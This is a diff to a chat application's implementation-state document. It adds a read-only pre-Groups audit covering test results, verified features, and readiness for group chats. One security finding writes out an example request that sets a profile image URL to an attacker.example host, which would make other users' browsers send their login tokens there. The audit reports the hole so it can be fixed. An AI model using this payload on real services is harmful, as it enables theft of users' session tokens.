@@ -32,11 +32,21 @@ stage list above; revisit only if explicitly requested later.
 
 ## Current status
 
-**Current stage: control-prompt Stage 4 (Blocking) — BACKEND ONLY, COMPLETE. Frontend NOT started.**
-**Next stage: 1.5 — Connection frontend (still not started — see checkpoint below for why this is
-out of stage order)**
+**Current stage (as of 2026-08-18, HEAD `86c7d48`): control-prompt Stages 1.5 through 4 are now
+COMPLETE, backend AND frontend — connections, DIRECT-conversation enforcement, and blocking all have
+working, verified UI. Several substantial features outside the PDF's numbered stages were also built
+in parallel (PWA WebSocket resume/recovery, a Settings screen with profile-photo visibility, and
+client-side chat export) — see "Checkpoint — Final Pre-Groups Stability Check (2026-08-18)" at the
+end of this document for the full audit this status is based on.**
+**Next stage: GROUPS ARCHITECTURE REVIEW (control-prompt Stage 5 / PDF Stage 4) — not started.**
 
-**Checkpoint note (2026-08-17):** a later conversation referred to the current point as "Stage 3"
+Everything below this point through "Checkpoint — Legacy DIRECT connection backfill (2026-08-18)" is
+the original per-stage record and is left as-is (historical, not rewritten). The **"Current status"
+block above supersedes the stale "BACKEND ONLY" / "not started" claims that follow** — those were
+accurate as of the 2026-08-17 checkpoint but not after `5a96cac` ("add connection and blocking
+frontend") and the many commits since. See the final checkpoint section for the up-to-date picture.
+
+**Checkpoint note (2026-08-17, historical):** a later conversation referred to the current point as "Stage 3"
 and requested a frontend audit (connection-request UI, pending/sent UI, accept/reject UI, blocking
 UI, etc.). That frontend does not exist yet in this repo — zero files under `connectx-frontend`
 reference connections or blocking, and no frontend file has changed since commit `7ae17f3` (Stage 1
@@ -498,7 +508,7 @@ stage (control-prompt Stage 3), not bundled into the frontend work.
 | 0A | Complete | `6afa0be` |
 | 0B | Complete | `3996197` |
 | 1 | Complete | `7ae17f3` |
-| 1.5 | Not started (frontend) | — |
+| 1.5 | Complete (connection + blocking frontend) | `5a96cac`, refined through `86c7d48` — see final checkpoint below |
 | 2 | **Data backfill script exists and has been run against the local dev `connectx_db`** (see "Legacy DIRECT connection backfill" checkpoint below) — this is the PDF's Stage 2 backfill, executed as an explicit, reviewed, one-time data operation, not application logic. The Stage 3 (`02c3444`) exemption mechanism is untouched and remains the reason old conversations keep working regardless of `connections` row presence; the two are complementary, not one replacing the other. | — (data-only; no code commit) |
 | 3 | Complete — backend only (DM creation now requires an accepted connection for *new* pairs; pre-existing pairs exempted per above) | `02c3444` |
 | 4 | Backend only, complete (blocking foundation + enforcement at DM-create, connection-request, and message-send boundaries). Frontend not started. | `00fb852` |
@@ -663,3 +673,200 @@ build (confirms zero frontend source changes).
 (new) and this document were added/edited; `connectx_db` gained 53 new `connections` rows via the
 script above. `connectx_test_db` was not touched (it is rebuilt fresh by `ddl-auto=create-drop` on
 every `mvn test` run and never depends on this script).
+
+---
+
+## Checkpoint — Final Pre-Groups Stability Check (2026-08-18)
+
+READ-ONLY audit requested as the final gate before Groups. No application behavior was modified —
+verification only, plus this document update. Performed via two parallel deep-inspection passes
+(Connections/DIRECT/Blocking; PWA-WebSocket/Settings/Chat-export/Web-Push) covering every file each
+area touches, plus direct DB inspection and a fresh `mvn test`/`tsc`/`vite build` run.
+
+**Git state:** branch `feature/pwa-notifications`, HEAD `86c7d48`, working tree clean, 2 commits
+ahead of `origin/feature/pwa-notifications` (`8d3e880`, `86c7d48` — not pushed). Everything back
+through Stage 0A (`6afa0be`) is confirmed a real, linear ancestor of HEAD (`git merge-base
+--is-ancestor` verified) — a prior read of this document momentarily looked like it referenced
+fabricated commits because they're older than a 15-commit `git log` window, not because they don't
+exist.
+
+**Build baseline:**
+- Backend: `mvn test` → **BUILD SUCCESS, 112/112 tests passed, 0 failures, 0 errors** (across 13 test
+  classes, including the 9 new profile-visibility-update tests added this session). The recurring
+  `SqlExceptionHelper` "Duplicate entry" ERROR-level log lines during `ReactionRaceIntegrationTest`/
+  `StarRaceIntegrationTest` are expected, caught-and-handled race-test noise, not failures — same
+  pre-existing pattern noted in every prior checkpoint.
+- Frontend: `npx tsc --noEmit` → clean, 0 errors. `npm run build` → succeeded (1663 modules
+  transformed).
+
+**Features verified implemented and working (backend + frontend, all confirmed by direct code
+reading this checkpoint, not by trusting prior memory):**
+- Connection requests: send/accept/reject/cancel, self-request/duplicate-pending/already-connected
+  rejection, block-precedence, race-safety (`REQUIRES_NEW` + constraint backstop).
+- DIRECT conversation authorization: new conversations require an active connection; pre-existing
+  (legacy/backfilled) conversations remain openable without one; sending a *new* message requires a
+  currently-active connection, not just membership; a block created after a request was sent still
+  blocks acceptance.
+- Blocking: block/unblock scoped to the authenticated caller only, `existsEitherDirection` enforced
+  at every relationship boundary (connections, conversations, messages), blocking terminates any
+  existing connection + cancels pending requests, blocked-list never leaks "who blocked me", search
+  excludes blocked pairs in either direction at the DB query level.
+- PWA/WebSocket resume: `WebSocketClient.connect()`'s guard uses the class's own `status` field
+  (not the previously-buggy `stompClient.active`); `visibilitychange`/`focus`/`online` all funnel
+  through one no-op-when-connected resume check; bounded backoff (1s→30s cap); no duplicate-socket
+  path found under simultaneous-event firing (traced synchronously — JS single-threadedness plus the
+  synchronous `status` flip make this safe).
+- Settings / Profile Photo Visibility: EVERYONE/CONNECTIONS enforced server-side at every DTO
+  composition site (batched to avoid N+1) *and* at the raw image-serving endpoint itself (not just
+  the JSON); NULL (pre-existing users) correctly treated as EVERYONE everywhere.
+- Chat export: 100% client-side generation, zero plaintext ever sent to the backend, reuses the
+  existing `before`/`limit` cursor pagination (no N+1), only the four real `MessageType` values are
+  handled.
+- Web Push / PWA notifications: untouched by every commit since `83d69de` — stable, not modified by
+  any of the connections/blocking/PWA-recovery/Settings work audited above.
+
+**Security audit — two findings, both READ-ONLY reported per instruction, NEITHER fixed:**
+
+1. **CONFIRMED BUG — user email leaked to any authenticated caller, unrelated to blocking/connection
+   status.** `UserDto.fromEntity(User)` (`connectx-backend/src/main/java/com/connectx/user/dto/
+   UserDto.java:20-32`) unconditionally sets `email`, and the viewer-aware 2-arg overload
+   (`:40-46`) only nulls `profileImageUrl` — `email` is never gated. This means `GET /api/v1/
+   users/{id}`, `GET /api/v1/users/search`, and every `ConversationMemberDto` (i.e. every
+   conversation's member list, `GET /api/v1/conversations`) hand any authenticated caller the
+   target's email address regardless of block status, connection status, or any relationship at
+   all. Contradicts the stated design intent in sibling DTOs' own comments (`ConnectionRequestDto
+   .java:8-11`, `UserBlockDto.java:8-9`: "should not leak more than discovery already does") — but
+   the "discovery" baseline (`/users/search`) is itself leaky, so that invariant is satisfied
+   against an already-broken baseline. **Directly relevant to Groups**: a group member-list UI will
+   almost certainly reuse `ConversationMemberDto`/`UserDto` as-is, which would scale this from "any
+   two users who've searched or shared a DIRECT chat" to "every member of every group sees every
+   other member's email." Recommend fixing before Groups ships a member-list or invite-search
+   surface built on these DTOs.
+
+2. **CONCERNING — latent JWT-exfiltration vector via unvalidated `profileImageUrl`.**
+   `PATCH /api/v1/users/me`'s `profileImageUrl` field (`UserProfileUpdateDto.java`) has no
+   server-side validation restricting it to the internal `/api/v1/profile-images/...` path —
+   `UserService.updateUserProfile` sets whatever string is supplied directly onto the entity. This
+   was harmless before this session's PWA/Settings work; it became a real exfiltration vector
+   specifically because of a change **I made in this session** (commit `8d3e880`):
+   `connectx-frontend/src/utils/profileImage.ts`'s `withAuthToken()` now appends the viewer's live
+   JWT (`?token=...`) to *any* `http://`/`https://` URL passed through `resolveProfileImageUrl`,
+   with no check that the URL's origin matches `config.apiBaseUrl` (`profileImage.ts:25-26`). The
+   current shipped UI never sets an external URL through this field (photo upload always derives an
+   internal path), so there is no exploit through the web client as shipped today — but any user
+   could call `PATCH /users/me` directly with `{"profileImageUrl":"https://attacker.example/x.png"}`,
+   and every other user whose browser subsequently renders that profile's avatar (`<img>` tag) would
+   leak their own JWT to the attacker's server via the request. **Recommend fixing before Groups**
+   (which will reuse this exact avatar-resolution path for group photos/member avatars, widening
+   exposure) via either origin-restricting `withAuthToken` client-side, or validating
+   `profileImageUrl` server-side to only accept the internal storage path pattern — ideally both.
+
+**Other audit notes (not bugs, flagged for Groups implementers' awareness):**
+- `connection_requests.pending_pair_key` (and `group_invitations.pending_invite_key`, same
+  generated-column shape) is *not* itself direction-symmetric at the DB level — the app-level
+  dual-direction pre-check is what actually prevents A→B + B→A pending duplicates; the DB constraint
+  alone only stops an exact-direction race. Currently fine (the app-level check is never bypassed),
+  but worth remembering since `group_invitations` was built with the identical pattern and currently
+  has zero application code exercising it.
+- `BlockService`'s idempotent re-block path skips re-running `terminateExistingConnectionAndPendingRequest`,
+  justified by "no code path can currently create a new connection once a block exists." This holds
+  today (connections are only created via `acceptRequest` or the one-time backfill script, both of
+  which check blocks first) but would need re-examination if Groups introduces any new path that
+  creates a `UserConnection` row (e.g. an "auto-connect group members" feature, if ever proposed).
+- `MessageService.editMessage` checks only `senderUserId == currentUserId`, with no independent
+  conversation-membership re-check — safe today only because there is no "leave/remove member from
+  conversation" feature yet. This becomes a real gap the moment Groups adds member removal/leave: an
+  ex-member could still edit their own historic messages in a group they're no longer part of.
+- Blocked-pair search exclusion (`UserRepository.searchByUsernameExcludingBlockedPairs`) hand-
+  duplicates the either-direction OR condition in its own JPQL rather than reusing
+  `UserBlockRepository.existsEitherDirection` — functionally correct today, but two independent
+  implementations of the same invariant is a sync-drift risk if blocking semantics ever change.
+
+**Database audit:** `connectx_db` — 87 users, 62 conversations (all `DIRECT`, 0 `GROUP`), 124
+`conversation_members`, 2012 messages, 60 `connections`, 17 `connection_requests`, 0 `user_blocks`
+(dev data, not indicative of feature health — blocking is exercised and tested, just not currently
+used on this dev DB). `chat_groups` and `group_invitations` tables exist (from Stage 0B's schema
+prep) with **0 rows each**, and a repo-wide grep of `connectx-backend/src/main/java` confirms **zero**
+Java files reference either table/entity name — confirmed still completely unused by application
+code, exactly as required for this checkpoint. `ConversationType` enum already contains `GROUP`
+(unused). `conversation_members.role`/`invited_by_user_id` columns exist (nullable, NULL on every
+current row), also unreferenced by any current entity/repository/service.
+
+**Protected systems — confirmed stable via `git log` on each path:**
+- E2EE crypto (`connectx-frontend/src/crypto/`) and `MessageService.java` — last touched `7e4ec72`
+  (connection-authorization enforcement, a legitimate, already-reviewed change), nothing since.
+- Web Push / service worker (`connectx-backend/.../push/`, `connectx-frontend/public/sw.js`) — last
+  touched `83d69de`, well before all connections/blocking/PWA-recovery/Settings work; confirmed
+  untouched by every commit audited this checkpoint.
+- WebSocket/STOMP (`connectx-frontend/src/websocket/`, `WebSocketConfig.java`,
+  `WebSocketAuthChannelInterceptor.java`) — last touched `4619626` (the in-scope PWA reconnect fix),
+  nothing since.
+- Authentication/JWT (`JwtAuthenticationFilter`, `JwtTokenProvider`, `SecurityConfig`) — not modified
+  by any commit in the audited range; the profile-image auth fix (finding above aside) reused the
+  filter's pre-existing `?token=` fallback rather than changing auth architecture.
+
+**Existing DIRECT data integrity:** unchanged this checkpoint (read-only). Prior checkpoints already
+verified byte-identical ciphertext/nonce/message counts across every schema/backfill change; nothing
+in this checkpoint touched the database.
+
+**Group readiness assessment** (based solely on what's verified in this repo — no invented
+implementation details):
+
+- *Reusable as-is*: `Conversation`/`ConversationMember` entities (already `ConversationType`-typed,
+  `GROUP` value already exists unused), the `chat_groups`/`group_invitations` schema (provisioned,
+  untouched, ready for entity mapping), `conversation_members.role`/`invited_by_user_id` columns
+  (provisioned, unused), message persistence/ciphertext model (keyed by `conversation_id`, not
+  DIRECT-specific), reaction/star/pin mechanics (conversation-agnostic), the STOMP topic-per-
+  conversation pattern (`/topic/conversation/{id}`, already id-based not DIRECT-specific).
+- *Must remain DIRECT-only*: `ConversationService.createOrGetDirectConversation`'s two-party
+  connection-required semantics (group creation needs its own flow against `chat_groups`, not an
+  extension of this method); the current 1:1 framing of `ProfileVisibilityService`
+  (EVERYONE/CONNECTIONS is defined in terms of exactly one other user — whether/how group membership
+  should interact with photo visibility is an open design question, not yet decided anywhere in this
+  repo).
+- *Must become conversation-type-aware*: `MessageService.sendMessage`'s DIRECT-specific
+  connection/block authorization block needs a parallel GROUP branch (membership + role-based send
+  permission); the frontend's `getOtherParticipant`-style "exactly one other member" framing used
+  throughout chat UI needs multi-member handling for group views; chat export is currently
+  explicitly DIRECT-gated and would need an explicit decision (extend vs. keep DIRECT-only) for
+  groups.
+- *Must be added — membership*: group membership CRUD (add/remove/role-change) against the existing
+  `conversation_members.role` column; a `chat_groups` entity/repository/service (table exists, zero
+  code references it); a `group_invitations` entity/repository/service (same — table exists, unused).
+- *Must be added — authorization*: role-based permission checks (`who_can_invite` policy already in
+  schema, no service logic yet); **WebSocket SUBSCRIBE-time authorization** — flagged as a known,
+  already-documented gap in this same document's Stage 8 entry and not re-verified fresh this
+  checkpoint (out of scope to touch, per protected-systems instruction), but load-bearing for Groups
+  specifically: DIRECT's implicit 2-party model makes an unauthenticated SUBSCRIBE lower-risk than it
+  will be once a GROUP topic could be subscribed to by any authenticated user who knows/guesses the
+  conversation id.
+- *Must be added — encryption*: **the single largest open architectural question.** Current E2EE is
+  strictly pairwise (ECDH between two parties' device keys); this repo has made no decision yet
+  between per-recipient encryption fan-out vs. a shared-group-key scheme. This document's own
+  PDF-stage mapping already treats group crypto as a "decoupled design spike" (PDF Stage 8) — that
+  remains true; nothing this checkpoint found changes or resolves it.
+- *Must be added — notifications*: Web Push fan-out to N group members (currently DIRECT/single-
+  recipient in shape) respecting each member's existing per-conversation mute state
+  (`conversation_members.muted_until`, already exists and reusable) — not audited deeply this
+  checkpoint since Web Push is a protected system; flagged as unverified-for-multi-recipient, not
+  confirmed broken.
+- *Must be added — UI*: group creation, member list/management, role indicators, invitation flow,
+  group settings (name/description/avatar/who-can-invite) — none of this exists in the frontend
+  today.
+- *Architectural risks before implementation, in rough priority order*: (1) E2EE group-encryption
+  scheme is undecided — blocks any real group *messaging* work regardless of how much scaffolding
+  gets built first; (2) WebSocket SUBSCRIBE-time auth gap must close before any group topic exists;
+  (3) the two security findings above (email leak, avatar-URL JWT exfiltration) will scale in
+  exposure the moment Groups reuses `UserDto`/`ConversationMemberDto`/avatar-resolution as-is for
+  member lists and group avatars — fixing both before building those surfaces is cheaper than
+  fixing them after; (4) `editMessage`'s missing membership re-check needs revisiting once
+  leave/remove-member exists; (5) the group membership/role schema has sat untouched since Stage 0B
+  and has never been exercised by real entity code — expect the same kind of minor friction Stage 1
+  hit when connection-schema entities were first wired up (e.g. Hibernate's alphabetical `ENUM`
+  reordering), not a reason to delay, just don't assume zero-friction.
+
+**Files changed this checkpoint:** `docs/CONNECTX_GROUP_IMPLEMENTATION_STATE.md` only (this
+document — status/stage-log corrections plus this section). No application source file was modified.
+
+**Next stage:** GROUPS ARCHITECTURE REVIEW. Do not begin implementation until that review explicitly
+starts.
